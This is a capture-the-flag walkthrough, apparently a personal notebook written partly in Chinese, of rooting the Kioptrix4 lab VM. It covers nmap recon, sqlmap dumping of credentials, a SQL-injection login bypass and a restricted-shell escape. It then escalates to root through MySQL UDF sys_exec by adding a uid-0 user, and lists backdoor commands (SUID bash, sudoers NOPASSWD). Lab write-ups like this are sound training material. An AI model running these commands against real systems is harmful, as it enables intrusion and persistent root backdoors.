

┌──(root㉿kali)-[~]
└─# nmap 192.168.232.146 -A --min-rate 9999 -r
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 21:44 EDT
Nmap scan report for 192.168.232.146 (192.168.232.146)
Host is up (0.0022s latency).
Not shown: 566 closed tcp ports (reset), 430 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
MAC Address: 00:0C:29:E0:B2:61 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 10h00m06s, deviation: 2h49m42s, median: 8h00m06s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name:
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2025-09-20T05:44:28-04:00

TRACEROUTE
HOP RTT     ADDRESS
1   2.16 ms 192.168.232.146 (192.168.232.146)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.75 seconds



##跑出一个database.sql，里面有个账户
dirsearch -u "http://192.168.232.146/"
![28b1f26bd0398295175e14f6a0a222dc.png](../_resources/28b1f26bd0398295175e14f6a0a222dc.png)





ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 john@192.168.232.146



sqlmap -r /root/ddd.txt --batch --level 3
![fc820e9154f71cc380740d9dd035db48.png](../_resources/fc820e9154f71cc380740d9dd035db48.png)


┌──(root㉿kali)-[~]
└─# sqlmap -r /root/ddd.txt --batch --level 3 --dbs
![710cc904f3396e3ee1190a52b88c17ff.png](../_resources/710cc904f3396e3ee1190a52b88c17ff.png)
找到三个库


┌──(root㉿kali)-[~]
└─# sqlmap -r /root/ddd.txt --batch --level 3  -D members --tables
![50bc0f6e4d19d4d4e0a16c340ea7f769.png](../_resources/50bc0f6e4d19d4d4e0a16c340ea7f769.png)
找到一个表members



┌──(root㉿kali)-[~]
└─# sqlmap -r /root/ddd.txt --batch --level 3  -D members -T members --dump
![8d98f83667af42c6715dad953220fd15.png](../_resources/8d98f83667af42c6715dad953220fd15.png)
找到两个账户
john:MyNameIsJohn
 robert:ADGAdsafdfwt4gadfga==

在web直接输入john，密码admin‘ or 1=1# 也行
![1774b898b4dbc6eb48874cf8d3d2ef11.png](../_resources/1774b898b4dbc6eb48874cf8d3d2ef11.png)



ssh登录账户
![5f3642147e2fe58778031fb223cd7f39.png](../_resources/5f3642147e2fe58778031fb223cd7f39.png)

shell逃逸
robert:~$ uname -a
*** unknown command: uname
robert:~$ cat /etc/crontab
*** unknown command: cat
robert:~$ os.system("/bin/sh")
*** unknown command: os.system("/bin/sh")
robert:~$ echo os.system("/bin/sh")
$
$ whoami
robert
robert:~$ echo os.system("/bin/sh")
$
$ whoami
robert
$
$ cd /var/www
$ ls
checklogin.php  database.sql  images  index.php  john  login_success.php  logout.php  member.php  robert
$ vi checklogin.php
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
$db_name="members"; // Database name
$tbl_name="members"; // Table name
![1573180987a6f9593ec6deb747aa9967.png](../_resources/1573180987a6f9593ec6deb747aa9967.png)

#通过root账户进入mysql
mysql -u root

#输出数据库版本
SELECT VERSION();  

#输出当前用户的权限
SHOW GRANTS FOR CURRENT_USER();
![44057499744e6060f8a1152ac8f4d572.png](../_resources/44057499744e6060f8a1152ac8f4d572.png)



显示有 ALL PRIVILEGES，权限够，能进行UDF提权
![4b2074b700cf64a418c3e57462e7685e.png](../_resources/4b2074b700cf64a418c3e57462e7685e.png)


mysql> show global variables like 'secure%';


直接创建
SELECT sys_exec('useradd -ou 0 -g 0 hacker');
SELECT sys_exec('echo "hacker:password" | chpasswd');

mysql> select sys_exec('useradd -ou 0 -g 0 guang');                                          +--------------------------------------+
| sys_exec('useradd -ou 0 -g 0 guang') |
+--------------------------------------+
| NULL                                 |
+--------------------------------------+
1 row in set (0.04 sec)

mysql> select sys_exec('echo "guang:123456" | chpasswd');
+--------------------------------------------+
| sys_exec('echo "guang:123456" | chpasswd') |
+--------------------------------------------+
| NULL                                       |
+--------------------------------------------+
1 row in set (0.04 sec)

mysql> exit
Bye
$ pwd
/var/www
$ si guang
/bin/sh: si: not found
$ su guang
Password:
Failed to add entry for user guang.
#whoami
root
#id
uid=0(root) gid=0(root) groups=0(root)




cd /root
ls -la

![883b6db5a55624f3d21fb4b2518a9f12.png](../_resources/883b6db5a55624f3d21fb4b2518a9f12.png)
发现flag
![7123008e6a4ba4f9ffc5d4e88e5323a3.png](../_resources/7123008e6a4ba4f9ffc5d4e88e5323a3.png)




还有其他方式能获取root权限
1.设置suid位，允许普通用户允许以root权限允许程序
select sys_exec('chmod u+s /bin/bash');
#容易被破坏：一旦管理员执行 chmod u-s /bin/bash，后门就失效了。

2.将用户添加到sudo组
select sys_exec('/usr/sbin/usermod -aG sudo john');
利用Linux的用户组权限模型，成为了 sudo 组的一员，获得了使用 sudo 的资格。

3.修改/etc/sudoers文件
select sys_exec('echo "john ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers');
本质： 直接修改 sudo的授权策略文件
这是最强大的sudo授权形式。 它意味着用户 john 可以在不提供任何密码的情况下，执行任何root命令。